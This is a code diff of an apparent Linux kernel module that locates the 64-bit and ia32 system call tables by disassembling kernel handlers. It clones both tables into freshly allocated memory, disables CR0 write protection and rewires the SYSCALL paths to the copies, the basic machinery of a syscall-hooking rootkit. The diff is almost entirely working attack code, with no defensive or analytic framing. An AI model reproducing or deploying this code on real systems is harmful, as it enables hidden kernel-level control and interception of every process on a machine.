@@ -97,7 +97,8 @@
 #define EAX_EDX_VAL(val, low, high) (val)
 #define EAX_EDX_RET(val, low, high) "=A" (val)
 #endif
-
+//#define sleep(var) for(var = 0; var <= 1024 * 1024 * 1024; var++) {}
+#define sleep(var)
 /*
  * Kernel shared definitions: labels, variables and functions.
  */
@@ -138,6 +139,9 @@ void *search___vmalloc_node_range(void *__vmalloc);
 inline unsigned long my_gate_offset(const gate_desc *g);
 extern int set_memory_x(unsigned long addr, int numpages);
 inline unsigned long long notrace my_rdmsr(unsigned int msr);
+int safe_zero(void *dst, size_t len);
+int clone_sct(void *dst, void *src, size_t len);
+int sct_len(void *src, size_t *out_len);
 
 /*
  * Global variables.
@@ -148,6 +152,7 @@ void * (*f__vmalloc_node_range)(unsigned long size, unsigned long align,
             unsigned long start, unsigned long end, gfp_t gfp_mask,
             pgprot_t prot, unsigned long vm_flags, int node,
             const void *caller) = NULL;
+long module_load_offset = 0;
 
 /*
  * those clears/sets the WP bit from CR0, to be able to disable the memory write protection.
@@ -157,12 +162,10 @@ void enable_wp(void);
 
 int init_module(void)
 {
-	size_t kernel_len = 0, kernel_paglen = 0, kernel_pages = 0, my_sct_len = 0;
+	size_t kernel_len = 0, kernel_paglen = 0, kernel_pages = 0, my_sct_len = 0, my_sct_pagelen = 0;
 	void *kernel_addr = NULL, *tmp = NULL;
 	long addr = 0;
 	int ret = 0;
-	size_t off;
-    char zero = 0;
 
     kernel_len = &kernel_end - &kernel_start;
     kernel_paglen = PAGE_ROUND_UP((unsigned long)&kernel_start + (kernel_len - 1)) - PAGE_ROUND_DOWN(&kernel_start);
@@ -230,44 +233,41 @@ int init_module(void)
 	/*
 	 * Reserve & clone a new (our) sys_call_table.
 	 */
-	while(sys_call_table[my_sct_len]) {
-		my_sct_len ++;
+	ret = sct_len(sys_call_table, &my_sct_len);
+	if (ret != 0) {
+		perr("Sorry, sct_len(sys_call_table) ret = %d.\n", ret);
+		return 0;
 	}
 	pinfo("sys_call_table len = %d\n", my_sct_len);
 
-	my_sct = f__vmalloc_node_range(PAGE_ROUND_UP(my_sct_len * sizeof(void *)), 1,
-                    MODULES_VADDR,
-                    MODULES_END, GFP_KERNEL,
-                    PAGE_KERNEL, 0, NUMA_NO_NODE,
-                    __builtin_return_address(0));
-
+	my_sct_pagelen = PAGE_ROUND_UP(my_sct_len * sizeof(long));
+	module_load_offset = (get_random_int() % 1024 + 1) * PAGE_SIZE;
+	my_sct = f__vmalloc_node_range(my_sct_pagelen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, PAGE_KERNEL, 0, NUMA_NO_NODE, __builtin_return_address(0));
+	//my_sct = vmalloc(my_sct_pagelen);
 	if (my_sct == NULL) {
-		perr("Sorry, can't reserve memory with __vmalloc_node_range().\n");
+		perr("Sorry, can't reserve memory with __vmalloc_node_range() for my_sct.\n");
 		return 0;
 	}
+	pinfo("reserved %d bytes at %p\n", my_sct_pagelen, my_sct);
 
 	// zero memory
-	for(zero = 0, off = 0; off < PAGE_ROUND_UP(my_sct_len * sizeof(void *)); off ++) {
-		ret = probe_kernel_write((void *)((long)my_sct + off), &zero, sizeof(char));
-		if (ret != 0) {
-			perr("Sorry, can't zero memory for our sct.\n");
-			return 0;
-		}
+	ret = safe_zero(my_sct, my_sct_pagelen);
+	if (ret != 0) {
+		perr("Sorry, can't zero memory of my_sct.\n");
+		return 0;
 	}
 	pinfo("my_sct zeroed!\n");
 
-	my_sct_len = 0;
-	while(sys_call_table[my_sct_len]) {
-		ret = probe_kernel_write(&my_sct[my_sct_len], &sys_call_table[my_sct_len], sizeof(long));
-		if (ret != 0) {
-			perr("Sorry, can't clone sys_call_table.\n");
-			return 0;
-		}
-		//my_sct[my_sct_len] = sys_call_table[my_sct_len];
-		my_sct_len ++;
-	}
+	sleep(ret);
 
+	ret = clone_sct(my_sct, sys_call_table, my_sct_len);
+	if (ret != 0) {
+		perr("Sorry, can't clone sys_call_table.\n");
+		return 0;
+	}
 	pinfo("my_sct = %p, len = %d\n", my_sct, my_sct_len);
+
+	sleep(ret);
 
 	/*
 	 * Install the new sct into SYSCALL handler.
@@ -284,12 +284,54 @@ int init_module(void)
 	}
 	pinfo("after psct_fastpath = %x, psct_slowpath = %x\n", *psct_fastpath, *psct_slowpath);
 
+	sleep(ret);
+
 	/*
-	 * Install the new sct into int $0x80.
+	 * Install the new sct into int $0x80 handler.
 	 */
 	ia32_sys_call_table = search_ia32sct_int80h(&pia32sct);
 	pinfo("ia32_sys_call_table = %p, ia32sct_location = %p\n", ia32_sys_call_table, pia32sct);
 
+	ret = sct_len(ia32_sys_call_table, &my_sct_len);
+	if (ret != 0) {
+		perr("Sorry, sct_len(ia32_sct) ret = %d.\n", ret);
+		// TODO: free memory.
+		return 0;
+	}
+	pinfo("ia32_sct len = %d\n", my_sct_len);
+
+	sleep(ret);
+
+	my_sct_pagelen = PAGE_ROUND_UP(my_sct_len * sizeof(long));
+	// TODO: add KASLR offset in start address.
+    my_ia32sct = f__vmalloc_node_range(my_sct_pagelen, 1, MODULES_VADDR, MODULES_END, GFP_KERNEL, PAGE_KERNEL, 0, NUMA_NO_NODE, __builtin_return_address(0));
+    if (my_ia32sct == NULL) {
+        perr("Sorry, can't reserve memory for my_ia32sct.\n");
+        return 0;
+    }
+	pinfo("reserved %d bytes at %p.\n", my_sct_pagelen, my_ia32sct);
+
+	sleep(ret);
+
+    // zero memory
+    ret = safe_zero(my_ia32sct, my_sct_pagelen);
+    if (ret != 0) {
+        perr("Sorry, can't zero memory for our sct.\n");
+        return 0;
+    }
+    pinfo("my_ia32sct zeroed!\n");	
+
+	sleep(ret);
+
+	ret = clone_sct(my_ia32sct, ia32_sys_call_table, my_sct_len);
+	if (ret != 0) {
+		perr("Sorry, clone_sct(my_ia32sct) ret = %d.\n", ret);
+		// TODO: free memory
+		return 0;
+	}
+	pinfo("ia32_sct cloned at = %p\n", my_ia32sct);
+
+	sleep(ret);
 /*
 	// restore SYSCALL handler
 	addr = (int) sys_call_table;
@@ -383,6 +425,69 @@ void cleanup_module(void)
 {
 }
 
+int safe_zero(void *dst, size_t len) {
+	char zero = 0;
+	size_t i = 0;
+	int ret = 0;
+	char *cdst = dst;
+
+	for(; i < len; i++) {
+		//pinfo("writing %d byte(s) at %p\r", sizeof(zero), &cdst[i]);
+        ret = probe_kernel_write(&cdst[i], &zero, sizeof(zero));
+        if (ret != 0) {
+            return ret;
+        }
+    }
+	//pinfo("\n");
+
+	return 0;
+}
+
+int clone_sct(void *dst, void *src, size_t len) {
+	size_t i = 0;
+	int ret = 0;
+	long *ldst = dst, *lsrc = src, addr;
+
+	for (; i < len; i++) {
+        ret = probe_kernel_read(&addr, &lsrc[i], sizeof(addr));
+        if (ret != 0) {
+            perr("Sorry, probe_kernel_reat() ret = %d, on %s().", ret, __func__);
+            return ret;
+        }
+
+        ret = probe_kernel_write(&ldst[i], &addr, sizeof(addr));
+        if (ret != 0) {
+            perr("Sorry, probe_kernel_write() ret = %d on %s().", ret, __func__);
+            return ret;
+        }
+    }
+
+	return 0;
+}
+
+int sct_len(void *src, size_t *out_len) {
+	long addr = 0;
+	size_t i = 0;
+	int ret = 0;
+	long *lsrc = src;
+
+    for (addr = 0, i = 0, *out_len = 0; 1; i++) {
+        ret = probe_kernel_read(&addr, &lsrc[i], sizeof(addr));
+        if (ret != 0) {
+            perr("Sorry, probe_kernel_read() ret = %d in %().", ret, __func__);
+            return ret;
+        }
+
+        if (addr == 0) { // NULL entry, we get in the end.
+            break;
+        }
+
+       *out_len += 1;
+    }
+
+	return 0;
+}
+
 // from http://vulnfactory.org/blog/2011/08/12/wp-safe-or-not/
 void disable_wp(void) {
     asm("cli\n\tmov\t%cr0, %rax\n\tand\t$0xfffffffffffeffff, %rax\n\tmov\t%rax, %cr0\n\tsti");
@@ -396,8 +501,12 @@ void *disass_search_inst_range_addr(void *addr, const char *inst, const char *fm
     csh handle;
     cs_insn *insn;
     void *addr_found = NULL;
-    size_t count, j, i, code_len, dist;
+    size_t count, j, code_len, dist;
     int pos_count = 0;
+
+#ifdef DISASS_DBG
+	size_t i;
+#endif
 
     if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
         perr("cs_open() error\n");
@@ -408,19 +517,25 @@ void *disass_search_inst_range_addr(void *addr, const char *inst, const char *fm
 
     for (code_len = 15; 1; code_len += 15) {
         count = cs_disasm(handle, addr, code_len, (unsigned long)addr, 0, &insn);
+#ifdef DISASS_DBG
         pinfo("%d instructions disassembled.\n", count);
+#endif
         if (count > 0) {
             for (j = 0; j < count; j++) {
+#ifdef DISASS_DBG
                 pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
                 for (i = 0; i < insn[j].size; i++) {
                     pinfo("%02x ", insn[j].bytes[i]);
                 }
                 pinfo("\n");
+#endif
                 if (strlen(insn[j].mnemonic) >= strlen(inst) && strncmp(insn[j].mnemonic, inst, strlen(inst)) == 0) {
 					sscanf(insn[j].op_str, fmt, &addr_found);
 					if (addr_found != NULL) {
 						dist = (unsigned long)addr_found - insn[j].address;
+#ifdef DISASS_DBG
 						pinfo("DIST = %lx\n", dist);
+#endif
 						if ((dist >= from && dist <= to) || ((dist * -1) >= from && (dist * -1) <= to)) {
 							pos_count ++;
 		                    if (pos_count == position) {
@@ -457,9 +572,12 @@ void *disass_search_inst_addr(void *addr, const char *inst, const char *fmt, siz
     cs_insn *insn;
 	void *addr_found = NULL;
     size_t count;
-    size_t j, i;
+    size_t j;
 	size_t code_len;
 	int pos_count = 0;
+#ifdef DISASS_DBG
+	size_t i = 0;
+#endif
 
 	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
         perr("cs_open() error\n");
@@ -470,14 +588,18 @@ void *disass_search_inst_addr(void *addr, const char *inst, const char *fmt, siz
 
 	for (code_len = 15; 1; code_len += 15) {
 	    count = cs_disasm(handle, addr, code_len, (unsigned long)addr, 0, &insn);
+#ifdef DISASS_DBG
 	    pinfo("%d instructions disassembled.\n", count);
+#endif
 	    if (count > 0) {
 	        for (j = 0; j < count; j++) {
+#ifdef DISASS_DBG
 	            pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
 	            for (i = 0; i < insn[j].size; i++) {
         	        pinfo("%02x ", insn[j].bytes[i]);
 				}
             	pinfo("\n");
+#endif
                 if (strlen(insn[j].mnemonic) >= strlen(inst) && strncmp(insn[j].mnemonic, inst, strlen(inst)) == 0) {
                     pos_count ++;
                     if (pos_count == position) {
@@ -514,9 +636,12 @@ void *disass_search_opstr_addr(void *addr, const char *opstr, const char *fmt, s
     cs_insn *insn;
     void *addr_found = NULL;
     size_t count;
-    size_t j, i;
+    size_t j;
     size_t code_len;
     int pos_count = 0;
+#ifdef DISASS_DBG
+	size_t i;
+#endif
 
     if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
         perr("cs_open() error\n");
@@ -527,14 +652,18 @@ void *disass_search_opstr_addr(void *addr, const char *opstr, const char *fmt, s
 
     for (code_len = 15; 1; code_len += 15) {
         count = cs_disasm(handle, addr, code_len, (unsigned long)addr, 0, &insn);
+#ifdef DISASS_DBG
         pinfo("%d instructions disassembled.\n", count);
+#endif
         if (count > 0) {
             for (j = 0; j < count; j++) {
+#ifdef DISASS_DBG
                 pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
                 for (i = 0; i < insn[j].size; i++) {
                     pinfo("%02x ", insn[j].bytes[i]);
                 }
                 pinfo("\n");
+#endif
                 if (strlen(insn[j].op_str) >= strlen(opstr) && memmem(insn[j].op_str, strlen(insn[j].op_str), opstr, strlen(opstr)) != NULL) {
                     pos_count ++;
                     if (pos_count == position) {
@@ -659,7 +788,7 @@ void *search_ia32sct_int80h(unsigned int **psct_addr) {
     store_idt(&idtr);
     pinfo("IDT address = %p, size = %d\n", idtr.address, idtr.size);
     idt = (gate_desc *) idtr.address;
-    ia32sct = (0xffffffffffffffff - (0 - (unsigned int)my_gate_offset(&idt[0x80])) + 1);
+    ia32sct = (void *) (0xffffffffffffffff - (0 - (unsigned int)my_gate_offset(&idt[0x80])) + 1);
     pinfo("int 0x80 handler address = %p\n", ia32sct);
 	//ia32sct = disass_search_inst_addr(ia32sct, "call", "%lx", 0x100, 2, (void **)psct_addr);
 	ia32sct = disass_search_inst_range_addr(ia32sct, "call", "%lx", 0x300, 1, 0x6f0000, 0xa10000, (void **)psct_addr);
@@ -712,7 +841,6 @@ void *search_sct_fastpath(unsigned int **psct_addr) {
 void *search_sct_slowpath(unsigned int **psct_addr) {
 	void *sct = (void *) my_rdmsr(MSR_LSTAR);
 	void *tmp = NULL;
-	unsigned int sct_off = 0;
 	tmp = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
 	if (tmp != NULL && memcmp(tmp + 3 + 4, "\xff\xe7", 2) == 0) { // found!
 		sct = tmp;
